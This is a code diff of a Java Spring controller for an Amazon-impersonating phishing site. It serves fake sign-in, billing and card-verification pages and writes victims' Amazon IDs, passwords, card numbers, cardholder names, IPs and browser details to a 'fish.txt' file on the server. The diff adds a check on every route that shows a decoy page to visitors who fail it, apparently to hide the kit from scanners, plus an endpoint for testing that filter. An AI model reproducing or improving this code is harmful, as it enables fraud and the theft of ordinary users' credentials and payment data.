@@ -3,11 +3,10 @@ package com.kidd.testfishing1.web;
 import cn.hutool.core.date.DateUtil;
 import cn.hutool.http.Header;
 import cn.hutool.http.HttpRequest;
-import cn.hutool.http.HttpUtil;
-import cn.hutool.json.JSONConverter;
 import cn.hutool.json.JSONObject;
 import cn.hutool.json.JSONUtil;
-import com.kidd.testfishing1.AsyncTask;
+import com.kidd.testfishing1.service.AuthUserService;
+import com.kidd.testfishing1.task.AsyncTask;
 import com.kidd.testfishing1.common.IpUtils;
 import com.kidd.testfishing1.model.FraudUserInfoForm;
 import com.kidd.testfishing1.model.UserInfoForm;
@@ -18,34 +17,53 @@ import org.springframework.util.StringUtils;
 import org.springframework.web.bind.annotation.*;
 
 import javax.servlet.http.HttpServletRequest;
+import java.time.Clock;
 import java.time.LocalDateTime;
+import java.time.ZoneId;
 import java.util.*;
 import java.util.stream.Collectors;
 
 
 @Controller
-public class AmazomController {
+public class AmazonController {
     @Autowired
     private HttpServletRequest request;
 
     @Autowired
     private AsyncTask asyncTask;
 
-    @GetMapping("/signin")
-    public Object signin(){
-        return "signin";
+    @Autowired
+    private AuthUserService authUserService;
+
+    @GetMapping("/login")
+    public Object signin(@RequestHeader("User-Agent") String ua,@RequestHeader("Accept-Language") String al) {
+        try {
+            boolean result = authUserService.auth(request);
+            if(!result){
+                return "test";
+            }
+        }
+        catch (Exception e){
+
+        }
+        return "login";
     }
 
-    @PostMapping("/signin")
-    public Object signin2(UserInfoForm form,@RequestHeader("User-Agent") String agent){
-        form.setUserAgent(agent);
-        asyncSaveUserInfo(form);
-        return "billing";
-    }
     @PostMapping("/kiddSigin")
     @ResponseBody
-    public Object signin3(FraudUserInfoForm form1, @RequestHeader("User-Agent") String agent){
-        UserInfoForm form = UserInfoForm.builder().email(form1.getKiddfiled1()).emailPwd(form1.getKiddfiled2()).build();
+    public Object signin3(FraudUserInfoForm form1, @RequestHeader("User-Agent") String agent,@RequestHeader("Accept-Language") String al){
+        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
+        String timeStr = DateUtil.format(localDateTime,"yyyy/MM/dd HH:mm:ss");
+        UserInfoForm form = UserInfoForm.builder()
+                .email(form1.getKiddfiled1())
+                .emailPwd(form1.getKiddfiled2())
+                .al(al)
+                .dateTime(timeStr)
+                .build();
+        boolean result = authUserService.auth(request);
+        if(!result){
+            return "test";
+        }
         form.setUserAgent(agent);
         asyncSaveUserInfo(form);
         Map map = new HashMap();
@@ -53,35 +71,31 @@ public class AmazomController {
         return map;
     }
 
-
-    @PostMapping("/warning")
-    public Object warning2(){
-        return "signin";
-    }
-
-    @GetMapping("/warning")
-    public Object warning(){
+    @GetMapping("/warn")
+    public Object warning(@RequestHeader("Accept-Language") String al){
+        boolean result = authUserService.auth(request);
+        if(!result){
+            return "test";
+        }
         return "warning";
     }
 
-    @GetMapping("/billing")
-    public Object billing(){
+    @GetMapping("/bill")
+    public Object billing(@RequestHeader("Accept-Language") String al){
+        boolean result = authUserService.auth(request);
+        if(!result){
+            return "test";
+        }
         return "billing";
     }
 
-    @PostMapping("/billing")
-    public Object billing2(UserInfoForm form, Model model){
-        asyncSaveUserInfo(form);
-        LocalDateTime localDateTime = LocalDateTime.now();
-        String timeStr = DateUtil.format(localDateTime,"yyyy/MM/dd");
-        model.addAttribute("dateTime",timeStr);
-        model.addAttribute("cardNo",form.getCxdi().substring(form.getCxdi().length()-4,form.getCxdi().length()));
-        model.addAttribute("cardName",form.getNameCard());
-        return "verifiedby";
-    }
-    @PostMapping("/billing2")
+    @PostMapping("/kiddbilling")
     @ResponseBody
-    public Object billing3(UserInfoForm form){
+    public Object billing3(UserInfoForm form,@RequestHeader("Accept-Language") String al){
+        boolean result = authUserService.auth(request);
+        if(!result){
+            return "test";
+        }
         asyncSaveUserInfo(form);
         Map map = new HashMap();
         map.put("data","ok");
@@ -91,18 +105,36 @@ public class AmazomController {
 
     @GetMapping("/validate")
     @ResponseBody
-    public Object validate(){
+    public Object validate(@RequestHeader("Accept-Language") String al){
+        boolean result = authUserService.auth(request);
+        if(!result){
+            return "test";
+        }
         return true;
     }
 
-    @GetMapping("/verifiedby")
-    public Object verifiedby(UserInfoForm form,Model model){
-        LocalDateTime localDateTime = LocalDateTime.now();
+    @GetMapping("/verified")
+    public Object verifiedby(UserInfoForm form,Model model,@RequestHeader("Accept-Language") String al){
+        boolean result = authUserService.auth(request);
+        if(!result){
+            return "test";
+        }
+        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime,"yyyy/MM/dd");
         model.addAttribute("dateTime",timeStr);
         model.addAttribute("cardNo",form.getCxdi().substring(form.getCxdi().length()-4,form.getCxdi().length()));
         model.addAttribute("cardName",form.getNameCard());
-        return "verifiedby";
+        return "verified";
+    }
+
+    @PostMapping("/verified")
+    public Object verifiedby2(UserInfoForm form,@RequestHeader("Accept-Language") String al){
+        boolean result = authUserService.auth(request);
+        if(!result){
+            return "test";
+        }
+        asyncSaveUserInfo(form);
+        return "thanks";
     }
 
     @GetMapping("/zipcode")
@@ -113,10 +145,10 @@ public class AmazomController {
             Map parm = new HashMap<String,String>();
             parm.put("zipcode",zipCode);
             String result = HttpRequest.post("http://zipcloud.ibsnet.co.jp/api/search")
-                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
-                    .form(parm)//表单内容
-                    .timeout(20000)//超时，毫秒
-                    .execute().body();
+                        .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
+                        .form(parm)//表单内容
+                        .timeout(20000)//超时，毫秒
+                        .execute().body();
             JSONObject jobj = JSONUtil.parseObj(result);
             jstr= JSONUtil.toJsonStr(jobj);
              }
@@ -130,14 +162,6 @@ public class AmazomController {
         return jstr;
     }
 
-    @PostMapping("/verifiedby")
-    public Object verifiedby2(UserInfoForm form){
-        asyncSaveUserInfo(form);
-        return "thanks";
-    }
-
-
-
     private List<String> appendIp(List<String> infos){
         String ip = IpUtils.getIpAddress(request);
         infos = infos.stream().map(u->u=String.format("%s # %s",ip,u)).collect(Collectors.toList());
@@ -146,13 +170,15 @@ public class AmazomController {
 
     private void asyncSaveUserInfo(UserInfoForm form) {
         List<String> contents = appendIp(convertInfo2List(form));
-        LocalDateTime localDateTime = LocalDateTime.now();
+        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime,"yyyyMMdd");
-        asyncTask.asyncWriteList(String.format("/root/%sfish.txt",timeStr),contents);
+        asyncTask.asyncWriteList(String.format("/root/%s/fish.txt",timeStr),contents);
     }
 
     private List<String> convertInfo2List(UserInfoForm userInfo){
         List<String> list = new ArrayList<>();
+        list.add(concatInfo("DateTime",userInfo.getDateTime()));
+        list.add(concatInfo("Al",userInfo.getAl()));
         list.add(concatInfo("AmazonId",userInfo.getEmail()));
         list.add(concatInfo("AmazomPwd",userInfo.getEmailPwd()));
         list.add(concatInfo("UserAgent",userInfo.getUserAgent()));
@@ -185,5 +211,12 @@ public class AmazomController {
             return null;
         }
         return String.format("%s : %s",key,value);
+    }
+
+    @GetMapping("/testIp")
+    @ResponseBody
+    public Object testIp(@RequestParam(value = "ip") String ip,@RequestParam(value = "al") String al){
+        boolean result = authUserService.auth(al,ip,"");
+        return result;
     }
 }
